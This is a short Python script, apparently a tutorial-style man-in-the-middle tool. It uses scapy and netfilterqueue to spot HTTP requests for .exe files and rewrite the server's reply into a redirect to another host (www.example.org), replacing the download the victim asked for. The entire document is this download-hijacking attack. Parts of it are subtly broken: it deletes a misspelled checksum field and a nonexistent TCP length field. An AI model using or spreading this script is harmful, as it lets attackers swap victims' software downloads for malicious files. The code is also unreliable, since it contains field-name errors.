from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.dns import IP
import netfilterqueue

acknowledge_list = []

def setting_load(packet, load):
    packet[Raw].load = load
    del packet[IP].chksm
    del packet[IP].len
    del packet[TCP].len
    del packet[TCP].chksm
    return packet

def pkt_process(packet):
    # converting the packet into a scapy packet for modification
    pkt_scapy = IP(packet.get_payload())
    # to check whether a packet contains the HTTP layer or not
    if pkt_scapy.haslayer(Raw):
        # checking if the destination port is 80, it means that the packet is leaving from our computer and going towards the http port
        if pkt_scapy[TCP].dport == 80:
            # to check whether there is any exe file in the load field
            if b".exe" in pkt_scapy[Raw].load:
                print("[*] exe Request")
                acknowledge_list.append(pkt_scapy[TCP].ack)

       # checking if the source port is 80, it means this packet is leaving from the http port
        elif pkt_scapy[TCP].sport == 80:
            if pkt_scapy[TCP].seq in acknowledge_list:
                acknowledge_list.remove(pkt_scapy[TCP].seq)
                print("[*] Replacing File ")
                modified = setting_load(pkt_scapy, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n")

                packet.set_payload(str(modified))



    packet.accept()

queue=netfilterqueue.NetfilterQueue()
queue.bind(0,pkt_process)
queue.run()
